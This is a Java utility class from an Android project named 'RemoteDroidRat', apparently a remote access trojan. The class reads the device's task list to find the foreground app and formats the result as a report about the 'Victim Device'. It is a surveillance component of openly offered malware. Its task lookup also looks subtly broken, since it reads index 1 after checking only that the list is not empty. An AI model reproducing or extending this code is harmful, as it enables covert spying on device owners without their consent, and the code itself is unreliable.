package com.KaranKumar.RemoteDroidRat.utiles;

import android.app.ActivityManager;
import android.content.Context;
import android.os.Build;
import java.util.List;

public class AppUtils {

    public static String getActiveAppName(Context context) {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
            return getActiveAppNameLollipop(context);
        } else {
            // Handle older Android versions or alternative implementation
            return null;
        }
    }

    private static String getActiveAppNameLollipop(Context context) {
        try {
            ActivityManager activityManager = (ActivityManager) context.getSystemService(Context.ACTIVITY_SERVICE);

            if (activityManager != null) {
                // Get the list of running tasks
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                    List<ActivityManager.AppTask> appTasks = activityManager.getAppTasks();

                    if (!appTasks.isEmpty()) {
                        ActivityManager.AppTask appTask = appTasks.get(1);

                        if (appTask != null) {
                            // Get the task's base intent, which includes the package name
                            String packageName = appTask.getTaskInfo().baseIntent.getComponent().getPackageName();

                            String activeApp = "Victim Device Active App is : name:- " + getAppNameFromPackageName(context, packageName) + " packageName:- " + packageName;

                            // Get the application label (app name) based on the package name
                            return activeApp;
                        }
                    } else {
                        // Handle the case where there are no running tasks
                        return null;
                    }
                } else {
                    // For versions prior to Marshmallow, use alternative method if needed
                    // For example, you can use getRunningTasks() but note that it's deprecated
                    return null;
                }
            }
        } catch (SecurityException e) {
            // Handle security exception (e.g., missing permission)
            e.printStackTrace();
        } catch (Exception e) {
            // Handle other exceptions
            e.printStackTrace();
        }

        return null;
    }
    private static String getAppNameFromPackageName(Context context, String packageName) {
        try {
            // Get the application label (app name) based on the package name
            return context.getPackageManager().getApplicationLabel(
				context.getPackageManager().getPackageInfo(packageName, 0).applicationInfo).toString();
        } catch (Exception e) {
            // Handle exceptions, such as PackageManager.NameNotFoundException
            e.printStackTrace();
        }

        return null;
    }
    
    
}
